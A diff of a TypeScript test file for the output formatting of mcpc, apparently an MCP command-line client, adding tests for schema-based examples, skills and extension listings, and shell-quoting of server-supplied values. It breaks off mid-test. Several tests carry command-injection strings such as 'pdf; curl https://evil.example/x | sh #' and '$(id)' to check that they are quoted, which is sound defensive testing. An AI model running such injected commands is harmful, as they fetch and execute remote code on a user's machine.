@@ -3,6 +3,7 @@
  */
 
 import type { MockInstance } from 'vitest';
+import { execFileSync } from 'node:child_process';
 import { extractAllTextContent } from '../../../src/cli/tool-result.js';
 
 // Mock chalk to return plain strings (required because Jest can't handle chalk's ESM imports)
@@ -40,6 +41,9 @@ import {
   formatTools,
   formatToolDetail,
   formatServerDetails,
+  formatTask,
+  formatTasks,
+  formatCompletionResult,
   formatDiscoverResult,
   formatResources,
   formatResourceDetail,
@@ -50,13 +54,16 @@ import {
   formatPromptDetail,
   formatSkills,
   formatSkillDetail,
+  formatDirectoryChildren,
   formatSessionLine,
   formatHuman,
+  formatOutput,
   logTarget,
   formatToolCallExample,
   formatToolHints,
   formatCallToolResultHuman,
   formatPath,
+  quoteShellArg,
   formatConnectStatusBadge,
 } from '../../../src/cli/output.js';
 import type {
@@ -66,7 +73,9 @@ import type {
   Prompt,
   ServerDetails,
   SessionData,
+  Skill,
 } from '../../../src/lib/types.js';
+import type { DecodedResourceContent } from '../../../src/lib/resource-content.js';
 
 describe('extractAllTextContent', () => {
   it('should return text for single text content item', () => {
@@ -980,6 +989,98 @@ describe('formatToolCallExample', () => {
     const output = formatToolCallExample(tool, '@s');
     expect(output).toContain(`config:='{"key":"value"}'`);
   });
+
+  it('should use an array or object example for array and object params without defaults', () => {
+    const tool: Tool = {
+      name: 'crawl',
+      inputSchema: {
+        type: 'object',
+        properties: {
+          urls: { type: 'array', items: { type: 'string' } },
+          ids: { type: 'array' },
+          options: { type: 'object' },
+        },
+        required: ['urls', 'ids', 'options'],
+      },
+    };
+
+    const output = formatToolCallExample(tool, '@s');
+    expect(output).toContain(`urls:='["something"]'`);
+    expect(output).toContain(`ids:='[]'`);
+    expect(output).toContain(`options:='{}'`);
+  });
+
+  it('should use an array or object example for nullable array and object params', () => {
+    const tool: Tool = {
+      name: 'crawl',
+      inputSchema: {
+        type: 'object',
+        properties: {
+          ids: { type: ['array', 'null'], items: { type: 'integer' } },
+          options: { type: ['null', 'object'] },
+          tags: { anyOf: [{ type: 'array', items: { type: 'string' } }, { type: 'null' }] },
+        },
+        required: ['ids', 'options', 'tags'],
+      },
+    };
+
+    const output = formatToolCallExample(tool, '@s');
+    expect(output).toContain(`ids:='[1]'`);
+    expect(output).toContain(`options:='{}'`);
+    expect(output).toContain(`tags:='["something"]'`);
+  });
+
+  it('should resolve $ref, tuple and required object properties in examples', () => {
+    const tool: Tool = {
+      name: 'plot',
+      inputSchema: {
+        type: 'object',
+        $defs: {
+          Point: {
+            type: 'object',
+            properties: { x: { type: 'number' }, label: { type: 'string' } },
+            required: ['x'],
+          },
+        },
+        properties: {
+          points: { type: 'array', items: { $ref: '#/$defs/Point' } },
+          range: {
+            type: 'array',
+            prefixItems: [{ type: 'integer', minimum: 0 }, { type: 'number' }],
+          },
+          mode: { const: 'fast' },
+        },
+        required: ['points', 'range', 'mode'],
+      },
+    };
+
+    const output = formatToolCallExample(tool, '@s');
+    expect(output).toContain(`points:='[{"x":1}]'`);
+    expect(output).toContain(`range:='[0,1]'`);
+    expect(output).toContain(`mode:='"fast"'`);
+  });
+
+  it('should stop following a recursive $ref', () => {
+    const tool: Tool = {
+      name: 'tree',
+      inputSchema: {
+        type: 'object',
+        $defs: {
+          Node: {
+            type: 'object',
+            properties: { child: { $ref: '#/$defs/Node' } },
+            required: ['child'],
+          },
+        },
+        properties: { root: { $ref: '#/$defs/Node' }, bad: { $ref: '#/$defs/%zz' } },
+        required: ['root', 'bad'],
+      },
+    };
+
+    const output = formatToolCallExample(tool, '@s');
+    expect(output).toContain(`root:='{"child":{"child":{}}}'`);
+    expect(output).toContain(`bad:='"something"'`);
+  });
 });
 
 describe('formatToolHints', () => {
@@ -1054,6 +1155,7 @@ describe('formatServerDetails', () => {
     expect(output).toContain('mcpc @test resources-list');
     expect(output).toContain('mcpc @test resources-read');
     expect(output).toContain('mcpc @test prompts-list');
+    expect(output).toContain('mcpc @test completion-complete prompt|resource <ref> <arg1:=val1');
     expect(output).toContain('mcpc @test logging-set-level');
 
     // Should contain instructions in code block
@@ -1077,9 +1179,10 @@ describe('formatServerDetails', () => {
     const output = formatServerDetails(details, '@notion');
 
     expect(output).toContain('Notion MCP (version: 1.2.0)');
-    expect(output).toContain("Notion's official MCP server.");
-    expect(output).toContain('Use your workspace as a system of record.');
-    expect(output).toContain('https://developers.notion.com/docs/mcp');
+    expect(output).toContain(
+      "* Description: Notion's official MCP server.\n               Use your workspace as a system of record."
+    );
+    expect(output).toContain('* Website: https://developers.notion.com/docs/mcp');
   });
 
   it('keeps the server line alone when no description or website URL is advertised', () => {
@@ -1278,6 +1381,17 @@ describe('formatServerDetails', () => {
     expect(output).toContain('mcpc @res resources-subscribe <uri> <file>');
   });
 
+  it('should not list completion-complete without the completions capability', () => {
+    const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
+      capabilities: { prompts: {} },
+      serverInfo: { name: 'Test Server', version: '1.0.0' },
+    };
+    const output = formatServerDetails(details, '@test');
+    expect(output).toContain('mcpc @test prompts-get');
+    expect(output).not.toContain('completion-complete');
+  });
+
   it('should not list resources-subscribe command without the subscribe capability', () => {
     const details: ServerDetails = {
       capabilities: {
@@ -1378,14 +1492,11 @@ describe('formatServerDetails', () => {
     expect(output).toContain('prompts-get');
   });
 
-  it('surfaces the skills extension when capabilities.extensions advertises it', () => {
+  it('surfaces the skills extension when a modern connection declares it', () => {
     const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
       capabilities: {
         resources: {},
-        // The skills extension is reported as a non-standard capability
-        // under `extensions["io.modelcontextprotocol/skills"]`. The mcpc
-        // overview should detect it and list both the capability line and
-        // the corresponding session commands.
         extensions: { 'io.modelcontextprotocol/skills': {} },
       } as ServerDetails['capabilities'],
       serverInfo: { name: 'Skills Server', version: '1.0.0' },
@@ -1393,13 +1504,73 @@ describe('formatServerDetails', () => {
 
     const output = formatServerDetails(details, '@skills');
 
-    expect(output).toContain('skills (experimental extension)');
+    expect(output).toContain('* skills');
     expect(output).toContain('mcpc @skills skills-list');
     expect(output).toContain('mcpc @skills skills-get');
+    // directoryRead defaults to false, so the directory command stays hidden
+    expect(output).not.toContain('resources-directory-read');
+  });
+
+  it('surfaces the directory-read command only when the server declares it', () => {
+    const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
+      capabilities: {
+        resources: {},
+        extensions: { 'io.modelcontextprotocol/skills': { directoryRead: true } },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Skills Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@skills');
+
+    expect(output).toContain('skills (with directory reads)');
+    expect(output).toContain('mcpc @skills resources-directory-read <uri>');
+  });
+
+  it('lists skills once, on the line carrying its settings', () => {
+    // The skills line is written by the capability list itself, so the generic extension
+    // list is told to skip it — otherwise the same extension appears twice.
+    const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
+      capabilities: {
+        resources: {},
+        extensions: {
+          'io.modelcontextprotocol/skills': { directoryRead: true },
+          'com.example/widgets': {},
+        },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Skills Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@skills');
+
+    expect(output.match(/^\* skills/gm)).toHaveLength(1);
+    expect(output).toContain('skills (with directory reads)');
+    // The other declaration still goes through the generic list
+    expect(output).toContain('com.example/widgets (unknown extension)');
+  });
+
+  it('annotates the extension but hides its commands on a legacy connection', () => {
+    // The extension is specified against 2026-07-28 and later, so its commands would
+    // only error out on a 2025-era connection.
+    const details: ServerDetails = {
+      protocolVersion: '2025-11-25',
+      capabilities: {
+        resources: {},
+        extensions: { 'io.modelcontextprotocol/skills': {} },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Legacy Skills', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@legacy');
+
+    expect(output).toContain('skills (not usable on MCP 2025-11-25)');
+    expect(output).not.toContain('skills-list');
   });
 
   it('does not surface skills when the extension is absent', () => {
     const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
       capabilities: {
         resources: {},
       },
@@ -1408,13 +1579,13 @@ describe('formatServerDetails', () => {
 
     const output = formatServerDetails(details, '@plain');
 
-    expect(output).not.toContain('skills (experimental extension)');
     expect(output).not.toContain('skills-list');
     expect(output).not.toContain('skills-get');
   });
 
   it('does not surface skills when extensions is present but empty', () => {
     const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
       capabilities: {
         resources: {},
         extensions: {},
@@ -1427,12 +1598,11 @@ describe('formatServerDetails', () => {
     expect(output).not.toContain('skills');
   });
 
-  it('also surfaces skills when advertised under capabilities.experimental', () => {
-    // The current MCP SDK strips unknown fields like `extensions` but
-    // preserves `experimental` — the long-standing escape hatch for
-    // non-standard capabilities. mcpc accepts the skills extension under
-    // either key for forward compatibility.
+  it('ignores the extension when declared only under capabilities.experimental', () => {
+    // `extensions` is where the spec puts extension declarations; `experimental` is a
+    // different, unrelated capability field.
     const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
       capabilities: {
         resources: {},
         experimental: { 'io.modelcontextprotocol/skills': {} },
@@ -1442,8 +1612,50 @@ describe('formatServerDetails', () => {
 
     const output = formatServerDetails(details, '@exp');
 
-    expect(output).toContain('skills (experimental extension)');
-    expect(output).toContain('mcpc @exp skills-list');
+    expect(output).not.toContain('skills-list');
+  });
+
+  it('names an advertised extension mcpc does not support, without offering commands', () => {
+    const details: ServerDetails = {
+      capabilities: {
+        tools: {},
+        extensions: { 'io.modelcontextprotocol/ui': { mimeTypes: ['text/html;profile=mcp-app'] } },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Apps Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@apps');
+
+    expect(output).toContain('MCP Apps (extension, not supported by mcpc)');
+  });
+
+  it('lists an unrecognized extension by its identifier', () => {
+    const details: ServerDetails = {
+      capabilities: {
+        tools: {},
+        extensions: { 'com.example/widgets': {} },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Vendor Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@v');
+
+    expect(output).toContain('com.example/widgets (unknown extension)');
+  });
+
+  it('does not report unrelated experimental capabilities as extensions', () => {
+    const details: ServerDetails = {
+      capabilities: {
+        tools: {},
+        experimental: { someVendorFlag: true },
+      } as ServerDetails['capabilities'],
+      serverInfo: { name: 'Experimental Server', version: '1.0.0' },
+    };
+
+    const output = formatServerDetails(details, '@x');
+
+    expect(output).not.toContain('someVendorFlag');
+    expect(output).not.toContain('unknown extension');
   });
 });
 
@@ -1643,6 +1855,16 @@ describe('formatResourceContents', () => {
     expect(output).toContain('(binary content not shown)');
     expect(output).toContain('mcpc @s resources-read test://bin -o <file>');
     expect(output).not.toContain(blob);
+  });
+
+  it('shell-quotes a binary resource URI the server made unsafe to paste', () => {
+    const blob = Buffer.from([0, 1]).toString('base64');
+    const uri = 'test://bin; curl https://evil.example/x | sh #';
+    const result = { contents: [{ uri, mimeType: 'image/png', blob }] };
+
+    const output = formatResourceContents(uri, result, { sessionName: '@s' });
+
+    expect(output).toContain(`mcpc @s resources-read "${uri}" -o <file>`);
   });
 
   it('separates multiple content items', () => {
@@ -1852,81 +2074,59 @@ describe('formatPromptDetail', () => {
 });
 
 describe('formatSkills', () => {
-  it('formats a list of skills with name and description', () => {
-    const skills = [
-      {
-        name: 'git-workflow',
-        description: 'Helpers for Git workflows',
-        type: 'skill-md',
-        url: 'skill://git-workflow/SKILL.md',
-      },
-      {
-        name: 'pdf',
-        description: 'PDF processing skill',
-        type: 'skill-md',
-        url: 'skill://pdf/SKILL.md',
-      },
-    ];
+  const skill = (
+    name: string,
+    description: string,
+    uri: string,
+    files: { uri: string; size: number }[] = [{ uri, size: 2314 }]
+  ): Skill => ({
+    uri,
+    frontmatter: { name, description },
+    resources: files.map((file) => ({ ...file, digest: `sha256:${'a'.repeat(64)}` })),
+  });
 
-    const output = formatSkills(skills, '@test');
+  it('lists every skill with its description, URI and manifest summary', () => {
+    const output = formatSkills(
+      [
+        skill('git-workflow', 'Helpers for Git workflows', 'skill://git-workflow/SKILL.md'),
+        skill('refunds', 'Process refunds', 'skill://acme/billing/refunds/SKILL.md', [
+          { uri: 'skill://acme/billing/refunds/SKILL.md', size: 1024 },
+          { uri: 'skill://acme/billing/refunds/examples/email.md', size: 1024 },
+        ]),
+      ],
+      '@test'
+    );
 
     expect(output).toContain('Skills (2):');
     expect(output).toContain('git-workflow');
     expect(output).toContain('Helpers for Git workflows');
-    expect(output).toContain('pdf');
-    expect(output).toContain('PDF processing skill');
-    // skill-md is the default; not surfaced
-    expect(output).not.toContain('[skill-md]');
-    // Hint references the session
+    expect(output).toContain('skill://acme/billing/refunds/SKILL.md');
+    expect(output).toContain('(1 file, 2.3 KB)');
+    expect(output).toContain('(2 files, 2.0 KB)');
     expect(output).toContain('mcpc @test skills-get');
     expect(output).toContain('--raw');
   });
 
-  it('flags non-default types like mcp-resource-template', () => {
-    const skills = [
-      {
-        name: 'paramd',
-        description: 'Parameterized',
-        type: 'mcp-resource-template',
-        url: 'skill://paramd/{id}/SKILL.md',
-      },
-    ];
-    const output = formatSkills(skills, '@test');
-    expect(output).toContain('[mcp-resource-template]');
+  it('marks a dynamic skill as publishing no digests', () => {
+    const entry = skill('daily', 'Live report', 'skill://reports/daily/SKILL.md');
+    const output = formatSkills([{ ...entry, resources: 'dynamic' }], '@test');
+    expect(output).toContain('dynamic, no digests published');
   });
 
-  it('returns a helpful empty message when no skills are found', () => {
+  it('says an empty listing is not proof there are no skills', () => {
     const output = formatSkills([], '@test');
-    expect(output).toContain('no skills found');
-    // Mentions both discovery paths so users know what to expect
-    expect(output).toContain('skill://index.json');
-    expect(output).toContain('SKILL.md');
+    expect(output).toContain('no skills listed');
+    expect(output).toContain('mcpc @test skills-get skill://<name>/SKILL.md');
   });
 
   it('omits the get hint when no session is provided', () => {
-    const skills = [
-      {
-        name: 'x',
-        description: 'y',
-        type: 'skill-md',
-        url: 'skill://x/SKILL.md',
-      },
-    ];
-    const output = formatSkills(skills);
+    const output = formatSkills([skill('x', 'y', 'skill://x/SKILL.md')]);
     expect(output).toContain('Skills (1):');
     expect(output).not.toContain('skills-get');
   });
 
   it('handles skills without descriptions', () => {
-    const skills = [
-      {
-        name: 'minimal',
-        description: '',
-        type: 'skill-md',
-        url: 'skill://minimal/SKILL.md',
-      },
-    ];
-    const output = formatSkills(skills);
+    const output = formatSkills([skill('minimal', '', 'skill://minimal/SKILL.md')]);
     expect(output).toContain('minimal');
     // Should not produce a stray dash when description is empty
     expect(output).not.toMatch(/`minimal`.*-\s*$/m);
@@ -1934,50 +2134,166 @@ describe('formatSkills', () => {
 });
 
 describe('formatSkillDetail', () => {
-  it('renders a skill with markdown body in a code fence', () => {
-    const result = {
-      contents: [
-        {
-          uri: 'skill://git-workflow/SKILL.md',
-          mimeType: 'text/markdown',
-          text: '---\nname: git-workflow\ndescription: Helpers\n---\n\n# Body',
-        },
-      ],
-    };
+  const SKILL_MD = '---\nname: git-workflow\ndescription: Helpers\n---\n\n# Body';
 
-    const output = formatSkillDetail('skill://git-workflow/SKILL.md', result);
+  const entry: Skill = {
+    uri: 'skill://git-workflow/SKILL.md',
+    frontmatter: { name: 'git-workflow', description: 'Helpers' },
+    resources: [
+      {
+        uri: 'skill://git-workflow/SKILL.md',
+        digest: `sha256:${'a'.repeat(64)}`,
+        size: SKILL_MD.length,
+      },
+      {
+        uri: 'skill://git-workflow/references/notes.md',
+        digest: `sha256:${'b'.repeat(64)}`,
+        size: 4096,
+      },
+    ],
+  };
+
+  const content = (text: string, mimeType = 'text/markdown'): DecodedResourceContent => ({
+    uri: 'skill://git-workflow/SKILL.md',
+    mimeType,
+    data: Buffer.from(text, 'utf-8'),
+    binary: false,
+    totalContents: 1,
+  });
+
+  it('renders the SKILL.md in a code fence with its verification status', () => {
+    const output = formatSkillDetail(entry, entry.uri, content(SKILL_MD), {
+      sessionName: '@test',
+    });
+
     expect(output).toContain('Skill:');
+    expect(output).toContain('git-workflow');
     expect(output).toContain('skill://git-workflow/SKILL.md');
     expect(output).toContain('text/markdown');
+    expect(output).toContain('verified against the skill manifest');
     expect(output).toContain('````');
     expect(output).toContain('# Body');
-    expect(output).toContain('name: git-workflow');
   });
 
-  it('omits MIME type when not provided', () => {
-    const result = {
-      contents: [{ uri: 'skill://x/SKILL.md', text: 'body' }],
+  it('shell-quotes the server-supplied skill name and file name in the read hint', () => {
+    const hostileName = 'pdf; curl https://evil.example/x | sh #';
+    const hostile: Skill = {
+      uri: 'skill://pdf/SKILL.md',
+      frontmatter: { name: hostileName, description: 'Helpers' },
+      resources: [
+        { uri: 'skill://pdf/SKILL.md', digest: `sha256:${'a'.repeat(64)}`, size: 1 },
+        { uri: 'skill://pdf/refs/a b.md', digest: `sha256:${'b'.repeat(64)}`, size: 1 },
+      ],
     };
-    const output = formatSkillDetail('skill://x/SKILL.md', result);
-    expect(output).not.toContain('MIME type:');
-    expect(output).toContain('body');
+    const output = formatSkillDetail(hostile, hostile.uri, content(SKILL_MD), {
+      sessionName: '@test',
+    });
+
+    expect(output).toContain(`mcpc @test skills-get "${hostileName}" "refs/a b.md"`);
   });
 
-  it('shows a placeholder when there is no text content', () => {
-    const result = {
-      contents: [{ uri: 'skill://x/SKILL.md', blob: 'aGk=', mimeType: 'application/octet-stream' }],
-    };
-    const output = formatSkillDetail('skill://x/SKILL.md', result);
-    expect(output).toContain('non-text content');
+  it('lists the supporting files from the manifest and how to read one', () => {
+    const output = formatSkillDetail(entry, entry.uri, content(SKILL_MD), {
+      sessionName: '@test',
+    });
+
+    expect(output).toContain('Supporting files (1):');
+    expect(output).toContain('references/notes.md');
+    expect(output).toContain('(4.0 KB)');
+    expect(output).toContain('mcpc @test skills-get git-workflow references/notes.md');
+  });
+
+  it('renders a supporting file on its own, named relative to the skill root', () => {
+    const fileUri = 'skill://git-workflow/references/notes.md';
+    const output = formatSkillDetail(entry, fileUri, {
+      ...content('notes'),
+      uri: fileUri,
+    });
+
+    expect(output).toContain('Skill file:');
+    expect(output).toContain('references/notes.md');
+    expect(output).toContain('(skill git-workflow)');
+    expect(output).toContain('notes');
+    expect(output).not.toContain('Supporting files');
+  });
+
+  it('says a dynamic skill is unverified rather than claiming verification', () => {
+    const output = formatSkillDetail(
+      { ...entry, resources: 'dynamic' },
+      entry.uri,
+      content(SKILL_MD)
+    );
+    expect(output).toContain('dynamic skill');
+    expect(output).toContain('unverified');
+  });
+
+  it('summarizes binary content instead of dumping it', () => {
+    const output = formatSkillDetail(
+      entry,
+      'skill://git-workflow/logo.png',
+      {
+        uri: 'skill://git-workflow/logo.png',
+        mimeType: 'image/png',
+        data: Buffer.from([0x89, 0x50, 0x4e, 0x47]),
+        binary: true,
+        totalContents: 1,
+      },
+      { sessionName: '@test' }
+    );
+    expect(output).toContain('binary content not shown');
+    expect(output).toContain('resources-read skill://git-workflow/logo.png -o <file>');
   });
 
   it('truncates the body when maxChars is provided', () => {
-    const result = {
-      contents: [{ uri: 'skill://x/SKILL.md', text: 'A'.repeat(10000) }],
-    };
-    const output = formatSkillDetail('skill://x/SKILL.md', result, { maxChars: 200 });
+    const output = formatSkillDetail(entry, entry.uri, content('A'.repeat(10000)), {
+      maxChars: 200,
+    });
     expect(output.length).toBeLessThan(500);
     expect(output).toContain('output truncated');
+  });
+});
+
+describe('formatDirectoryChildren', () => {
+  const children: Resource[] = [
+    { uri: 'skill://pdf/templates/invoice.md', name: 'invoice.md', mimeType: 'text/markdown' },
+    { uri: 'skill://pdf/templates/regional', name: 'regional', mimeType: 'inode/directory' },
+  ];
+
+  it('lists children and marks subdirectories', () => {
+    const output = formatDirectoryChildren('skill://pdf/templates', children, '@test');
+
+    expect(output).toContain('Directory skill://pdf/templates (2):');
+    expect(output).toContain('invoice.md');
+    expect(output).toContain('text/markdown');
+    expect(output).toContain('regional');
+    expect(output).toContain('skill://pdf/templates/regional');
+  });
+
+  it('points at the subdirectory to descend into', () => {
+    const output = formatDirectoryChildren('skill://pdf/templates', children, '@test');
+    expect(output).toContain('mcpc @test resources-directory-read skill://pdf/templates/regional');
+  });
+
+  it('shell-quotes a subdirectory URI the server made unsafe to paste', () => {
+    const hostile: Resource = {
+      uri: 'skill://pdf/templates/x; curl https://evil.example/x | sh #',
+      name: 'x',
+      mimeType: 'inode/directory',
+    };
+    const output = formatDirectoryChildren('skill://pdf/templates', [hostile], '@test');
+    expect(output).toContain(
+      'mcpc @test resources-directory-read "skill://pdf/templates/x; curl https://evil.example/x | sh #"'
+    );
+  });
+
+  it('suggests reading a file when there is no subdirectory', () => {
+    const output = formatDirectoryChildren('skill://pdf/templates', [children[0]!], '@test');
+    expect(output).toContain('mcpc @test resources-read <uri>');
+  });
+
+  it('reports an empty directory', () => {
+    const output = formatDirectoryChildren('skill://pdf/empty', [], '@test');
+    expect(output).toContain('(empty)');
   });
 });
 
@@ -2292,6 +2608,59 @@ describe('truncateOutput', () => {
   });
 });
 
+describe('quoteShellArg', () => {
+  it('leaves shell-safe skill names and URIs unquoted', () => {
+    expect(quoteShellArg('git-workflow')).toBe('git-workflow');
+    expect(quoteShellArg('skill://pdf/references/FORMS.md')).toBe(
+      'skill://pdf/references/FORMS.md'
+    );
+  });
+
+  it('quotes a value that would otherwise end the command or start another', () => {
+    expect(quoteShellArg('pdf; curl https://evil.example/x | sh #')).toBe(
+      '"pdf; curl https://evil.example/x | sh #"'
+    );
+    expect(quoteShellArg('a$(id)b')).toBe('"a\\$(id)b"');
+    expect(quoteShellArg('a`id`b')).toBe('"a\\`id\\`b"');
+  });
+
+  it('escapes backslashes so they cannot neutralize the escaping of `$` or the closing quote', () => {
+    // Unescaped, `\$(id)` would render as `"\\$(id)"`: a literal backslash followed by a live
+    // command substitution.
+    expect(quoteShellArg('\\$(id)', 'linux')).toBe('"\\\\\\$(id)"');
+    expect(quoteShellArg('a b\\', 'linux')).toBe('"a b\\\\"');
+    expect(quoteShellArg('\\`id`', 'linux')).toBe('"\\\\\\`id\\`"');
+    expect(quoteShellArg('x\\"; id; "', 'linux')).toBe('"x\\\\\\"; id; \\""');
+  });
+
+  it.skipIf(process.platform === 'win32')(
+    'round-trips hostile values through a real POSIX shell as one literal argument',
+    () => {
+      const hostile = [
+        '\\$(echo PWNED)',
+        '$(echo PWNED)',
+        '`echo PWNED`',
+        'a b\\',
+        'x\\"; echo PWNED; "',
+        '\\\\$(echo PWNED)',
+        'pdf; echo PWNED #',
+        'C:\\Program Files\\x $HOME',
+      ];
+      for (const value of hostile) {
+        const out = execFileSync('sh', ['-c', `printf %s ${quoteShellArg(value, 'linux')}`], {
+          encoding: 'utf8',
+          env: { PATH: process.env.PATH ?? '/usr/bin:/bin' },
+        });
+        expect(out).toBe(value);
+      }
+    }
+  );
+
+  it('leaves backslashes alone on Windows, where they separate path segments', () => {
+    expect(quoteShellArg('C:\\Program Files\\x', 'win32')).toBe('"C:\\Program Files\\x"');
+  });
+});
+
 describe('formatPath', () => {
   it('leaves simple paths unquoted', () => {
     expect(formatPath('/Users/jan/.cursor/mcp.json')).toBe('/Users/jan/.cursor/mcp.json');
@@ -2315,7 +2684,7 @@ describe('formatPath', () => {
   });
 
   it('quotes backslash paths on POSIX, where backslash is a shell escape character', () => {
-    expect(formatPath('/tmp/a\\b/mcp.json', 'linux')).toBe('"/tmp/a\\b/mcp.json"');
+    expect(formatPath('/tmp/a\\b/mcp.json', 'linux')).toBe('"/tmp/a\\\\b/mcp.json"');
   });
 
   it('escapes characters that stay special inside double quotes', () => {
@@ -2350,6 +2719,7 @@ describe('formatCallToolResultHuman', () => {
     expect(output).toContain('Content:');
     expect(output).toContain('````');
     expect(output).toContain('Hello world');
+    expect(output).not.toContain('--json');
   });
 
   it('should format multiple text content blocks separately', () => {
@@ -2398,19 +2768,20 @@ describe('formatCallToolResultHuman', () => {
     expect(output).toContain('Structured content:');
     expect(output).toContain('"key"');
     expect(output).toContain('"value"');
+    expect(output).not.toContain('--json');
   });
 
-  it('should skip structuredContent when visible Content is present', () => {
+  it('should hint how to retrieve structuredContent when visible Content is present', () => {
     const result = {
       content: [{ type: 'text' as const, text: 'data' }],
       structuredContent: { key: 'value' },
     };
     const output = formatCallToolResultHuman(result);
-    // Content already conveys the result — Structured content is redundant
-    // verbose output and is suppressed (use --json for the full payload).
     expect(output).toContain('Content:');
     expect(output).toContain('data');
-    expect(output).not.toContain('Structured content');
+    expect(output).toContain('To see the `structuredContent` field, re-run with --json');
+    expect(output).not.toContain('"key"');
+    expect(output).not.toContain('"value"');
   });
 
   it('should not show structuredContent section when empty', () => {
@@ -2453,7 +2824,9 @@ describe('formatCallToolResultHuman', () => {
     const output = formatCallToolResultHuman(result);
     expect(output).toContain('Content:');
     expect(output).toContain('summary');
-    expect(output).not.toContain('Structured content');
+    expect(output).toContain('--json');
+    expect(output).toContain('structuredContent');
+    expect(output).not.toContain('Structured content:');
   });
 
   it('should treat a null structuredContent as absent (SEP-2106)', () => {
@@ -2477,6 +2850,7 @@ describe('formatCallToolResultHuman', () => {
     expect(output).not.toContain('Content:');
     expect(output).toContain('Structured content:');
     expect(output).toContain('"results"');
+    expect(output).not.toContain('--json');
   });
 
   it('should skip duplicate text block even when pretty-printed', () => {
@@ -2490,6 +2864,23 @@ describe('formatCallToolResultHuman', () => {
     expect(output).toContain('Structured content:');
   });
 
+  it.each([
+    { label: 'an array', sc: ['a', 'b'] },
+    { label: 'a number', sc: 42 },
+    { label: 'a string', sc: 'done' },
+    { label: 'a boolean', sc: false },
+  ])('should skip the duplicate text block for $label structuredContent', ({ sc }) => {
+    const result = {
+      content: [{ type: 'text' as const, text: JSON.stringify(sc) }],
+      structuredContent: sc,
+    };
+    const output = formatCallToolResultHuman(result);
+    // Nothing is hidden, so nothing is left to point at --json for
+    expect(output).not.toContain('Content:');
+    expect(output).toContain('Structured content:');
+    expect(output).not.toContain('--json');
+  });
+
   it('should keep non-matching text blocks and suppress structuredContent', () => {
     const result = {
       content: [{ type: 'text' as const, text: 'Human-readable summary' }],
@@ -2498,7 +2889,8 @@ describe('formatCallToolResultHuman', () => {
     const output = formatCallToolResultHuman(result);
     expect(output).toContain('Content:');
     expect(output).toContain('Human-readable summary');
-    expect(output).not.toContain('Structured content');
+    expect(output).toContain('--json');
+    expect(output).not.toContain('"results"');
   });
 
   it('should show structuredContent when there are no content blocks', () => {
@@ -2523,10 +2915,55 @@ describe('formatCallToolResultHuman', () => {
     };
     const output = formatCallToolResultHuman(result);
     // The first text block (non-matching) is kept; the JSON duplicate is omitted.
-    // Since visible Content remains, Structured content is suppressed too.
+    // Since visible Content remains, show a retrieval hint for the structured data.
     expect(output).toContain('Content:');
     expect(output).toContain('Summary');
-    expect(output).not.toContain('Structured content');
+    expect(output).toContain('--json');
+    expect(output).toContain('structuredContent');
+    expect(output).not.toContain('"key"');
+    expect(output.match(/````/g)).toHaveLength(2);
+  });
+
+  it.each([0, false, '', ['a', 'b']].map((structuredContent) => ({ structuredContent })))(
+    'should hint about non-object structuredContent $structuredContent alongside visible content',
+    ({ structuredContent }) => {
+      const output = formatCallToolResultHuman({
+        content: [{ type: 'text', text: 'Summary' }],
+        structuredContent,
+      });
+      expect(output).toContain('Summary');
+      expect(output).toContain('--json');
+      expect(output).toContain('structuredContent');
+      expect(output).not.toContain('Structured content:');
+    }
+  );
+
+  it('should hint about structuredContent alongside non-text content', () => {
+    const output = formatCallToolResultHuman({
+      content: [{ type: 'image', data: 'aGVsbG8=', mimeType: 'image/png' }],
+      structuredContent: { caption: 'An image' },
+    });
+    expect(output).toContain('[Image: image/png');
+    expect(output).toContain('--json');
+    expect(output).toContain('structuredContent');
+    expect(output).not.toContain('"caption"');
+  });
+
+  it('should preserve the full JSON result after hiding duplicate text in human output', () => {
+    const result = {
+      content: [
+        { type: 'text' as const, text: 'Summary' },
+        { type: 'text' as const, text: '{"answer":42}' },
+      ],
+      structuredContent: { answer: 42 },
+      _meta: { cost: 0.01 },
+      isError: true,
+    };
+    const expectedJson = JSON.stringify(result);
+    const human = formatCallToolResultHuman(result);
+    expect(human).toContain('--json');
+    expect(human).not.toContain('"answer"');
+    expect(JSON.parse(formatOutput(result, 'json'))).toEqual(JSON.parse(expectedJson));
   });
 
   it('should format resource_link content blocks', () => {
@@ -2626,11 +3063,12 @@ describe('formatCallToolResultHuman', () => {
     expect(output).toContain('Resource link');
     expect(output).toContain('Metadata:');
     expect(output).toContain('"cost"');
-    // Structured content is redundant when Content already conveys the result
-    expect(output).not.toContain('Structured content');
+    expect(output).toContain('--json');
+    expect(output).not.toContain('"parsed"');
 
-    // Correct ordering: Content → Metadata
-    expect(output.indexOf('Content:')).toBeLessThan(output.indexOf('Metadata:'));
+    // Correct ordering: Content → structured content hint → Metadata
+    expect(output.indexOf('Content:')).toBeLessThan(output.indexOf('--json'));
+    expect(output.indexOf('--json')).toBeLessThan(output.indexOf('Metadata:'));
   });
 
   it('should show Structured content and Metadata when content is empty', () => {
@@ -2649,5 +3087,253 @@ describe('formatCallToolResultHuman', () => {
 
     // Correct ordering: Structured content → Metadata
     expect(output.indexOf('Structured content:')).toBeLessThan(output.indexOf('Metadata:'));
+  });
+});
+
+describe('formatServerDetails with the tasks extension', () => {
+  it('lists the extension and offers the task commands on a 2026-07-28 connection', () => {
+    const details: ServerDetails = {
+      protocolVersion: '2026-07-28',
+      capabilities: {
+        tools: { listChanged: false },
+        extensions: { 'io.modelcontextprotocol/tasks': {} },
+      },
+      serverInfo: { name: 'Modern Server', version: '1.0.0' },
+      connectionMode: 'stateless',
+    };
+
+    const output = formatServerDetails(details, '@modern');
+
+    expect(output).toContain('* tasks (extension)');
